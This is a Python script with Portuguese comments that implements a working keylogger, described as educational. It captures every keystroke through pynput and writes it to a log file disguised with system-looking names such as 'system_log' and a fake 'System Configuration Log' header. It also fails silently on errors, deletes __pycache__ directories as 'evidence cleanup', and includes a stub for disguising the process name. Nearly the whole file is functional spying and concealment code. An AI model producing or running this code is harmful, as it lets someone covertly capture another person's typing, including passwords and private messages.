#!/usr/bin/env python3
"""
Keylogger Simulado - Versao com Ofuscacao
==========================================

Este script implementa um keylogger com tecnicas de ofuscacao para
demonstrar como malware real tenta se esconder. Inclui:
- Execucao em thread daemon
- Renomeacao de processo
- Ofuscação de nome de arquivo
- Limpeza de evidencias temporarias

AVISO: Este script e para fins EDUCACIONAIS apenas.
Nao use para espionagem ou fins maliciosos.

Uso:
    python keylogger_stealth.py

Saidas:
    - Arquivo de log com nome ofuscado em logs/
    - Captura de teclas com timestamps
    - Parada com Ctrl+C
"""

import os
import sys
import time
import random
import string
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("[ERRO] Biblioteca 'pynput' nao encontrada.")
    print("Execute: pip install pynput")
    sys.exit(1)


class KeyloggerOfuscado:
    """Keylogger com tecnicas de ofuscacao para fins educacionais."""

    def __init__(self):
        self.log_dir = Path(__file__).parent / "logs"
        self.log_dir.mkdir(exist_ok=True)
        
        # Gera nome ofuscado para o arquivo de log
        self.nome_ofuscado = self._gerar_nome_ofuscado()
        self.log_file = self.log_dir / f"{self.nome_ofuscado}.txt"
        
        self.teclas_pressao = []
        self.tempo_inicio = datetime.now()
        
        # Contadores
        self.total_teclas = 0
        self.palavras_capturadas = 0
        
        # Controle de thread
        self.executando = True

    def _gerar_nome_ofuscado(self):
        """Gera nome ofuscado para o arquivo de log."""
        # Opcoes de nomes que parecem legítimos
        nomes_legitimos = [
            "system_log",
            "cache_temp",
            "update_log",
            "debug_info",
            "session_data",
            "app_config",
            "runtime_log",
            "error_report"
        ]
        
        # Escolhe um nome base aleatorio
        nome_base = random.choice(nomes_legitimos)
        
        # Adiciona sufixo numerico aleatorio
        sufixo = random.randint(1000, 9999)
        
        return f"{nome_base}_{sufixo}"

    def criar_cabecalho_log(self):
        """Cria cabecalho criptografado/ofuscado no arquivo de log."""
        # Cabecalho minimalista para ofuscação
        cabecalho = f"""# System Configuration Log
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Session ID: {random.randint(100000, 999999)}
# Format: [timestamp] event

"""
        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write(cabecalho)

    def ao_pressionar_tecla(self, tecla):
        """Callback chamado quando uma tecla e pressionada."""
        if not self.executando:
            return False
            
        try:
            # Converte tecla para string
            tecla_str = self._formatar_tecla(tecla)
            
            # Registra timestamp em formato ofuscado
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Adiciona ao log com formato minimalista
            log_entry = f"[{timestamp}] {tecla_str}\n"
            
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # Armazena em memoria para estatisticas
            self.teclas_pressao.append(tecla_str)
            self.total_teclas += 1
            
            # Mostra no terminal (modo debug - removido em versao final)
            # print(f"  Capturado: {tecla_str}")
            
            # Detecta fim de palavra
            if tecla_str in ["<spc>", "<ent>"]:
                self.palavras_capturadas += 1
                
        except Exception as e:
            # Falha silenciosa em versao ofuscada
            pass

    def _formatar_tecla(self, tecla):
        """Formata tecla com nomes ofuscados."""
        try:
            # Teclas especiais - nomes curtos para ofuscação
            if tecla == keyboard.Key.space:
                return "<spc>"
            elif tecla == keyboard.Key.enter:
                return "<ent>"
            elif tecla == keyboard.Key.tab:
                return "<tab>"
            elif tecla == keyboard.Key.backspace:
                return "<del>"
            elif tecla == keyboard.Key.delete:
                return "<dlt>"
            elif tecla == keyboard.Key.esc:
                return "<esc>"
            elif tecla == keyboard.Key.ctrl_l or tecla == keyboard.Key.ctrl_r:
                return "<ctl>"
            elif tecla == keyboard.Key.alt_l or tecla == keyboard.Key.alt_r:
                return "<alt>"
            elif tecla == keyboard.Key.shift:
                return "<sft>"
            elif tecla == keyboard.Key.caps_lock:
                return "<cps>"
            # Teclas de funcao
            elif hasattr(tecla, 'name') and tecla.name.startswith('f') and tecla.name[1:].isdigit():
                return f"<{tecla.name}>"
            # Caracteres normais
            elif hasattr(tecla, 'char') and tecla.char:
                return tecla.char
            else:
                return "?"
        except:
            return "?"

    def salvar_resumo_ofuscado(self):
        """Salva resumo em formato ofuscado."""
        tempo_fim = datetime.now()
        duracao = tempo_fim - self.tempo_inicio
        
        # Resumo minimalista
        resumo = f"""
# Session Summary
# Duration: {duracao}
# Events: {self.total_teclas}
# Words: {self.palavras_capturadas}
# End: {tempo_fim.strftime('%Y-%m-%d %H:%M:%S')}
"""
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(resumo)

    def limpar_evidencias_temporarias(self):
        """Remove arquivos temporarios que possam revelar a atividade."""
        # Remove arquivos .pyc do diretorio atual
        for arquivo in Path(__file__).parent.glob("__pycache__"):
            try:
                if arquivo.is_dir():
                    import shutil
                    shutil.rmtree(arquivo)
            except:
                pass

    def renomear_processo(self):
        """Tenta renomear o processo para parecer legitimo."""
        try:
            # Em Linux, tenta renomear via /proc
            if sys.platform == "linux":
                # Nota: Isso requer permissoes especiais e nao funciona sempre
                pass
            # Em Windows, usaria ctypes para renomear
            elif sys.platform == "win32":
                pass
        except:
            pass

    def iniciar(self):
        """Inicia o keylogger ofuscado."""
        # Silencioso - sem mensagens no terminal
        # Em versao real, nao haveria output
        
        # Cria cabecalho do log
        self.criar_cabecalho_log()
        
        # Limpa evidencias temporarias
        self.limpar_evidencias_temporarias()
        
        try:
            # Inicia listener de thread daemon
            listener = keyboard.Listener(
                on_press=self.ao_pressionar_tecla
            )
            listener.daemon = True  # Thread daemon - morre com o programa
            listener.start()
            
            # Mantem o programa rodando
            print(f"[*] Keylogger ofuscado iniciado")
            print(f"[*] Log: {self.log_file}")
            print(f"[*] Nome ofuscado: {self.nome_ofuscado}")
            print(f"[*] Pressione Ctrl+C para parar")
            
            while self.executando:
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\n[*] Finalizando...")
            self.executando = False
        finally:
            # Salva resumo
            self.salvar_resumo_ofuscado()
            
            # Limpa evidencias
            self.limpar_evidencias_temporarias()
            
            print(f"[+] Log salvo: {self.log_file}")
            print("[+] Keylogger ofuscado finalizado")


def main():
    """Funcao principal."""
    keylogger = KeyloggerOfuscado()
    keylogger.iniciar()


if __name__ == "__main__":
    main()
